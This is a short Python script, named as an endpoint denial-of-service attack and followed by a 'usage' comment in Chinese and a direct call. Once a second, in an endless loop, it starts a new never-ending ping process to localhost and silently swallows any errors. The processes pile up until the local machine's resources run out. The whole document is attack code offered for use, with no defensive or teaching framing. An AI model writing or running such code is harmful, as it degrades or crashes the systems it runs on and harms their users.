import subprocess
import time

def endpoint_dos_attack():
    while True:
        try:
            subprocess.Popen(['ping', '-t', '127.0.0.1'])
        except:
            pass
        time.sleep(1)

# 使用方法
endpoint_dos_attack()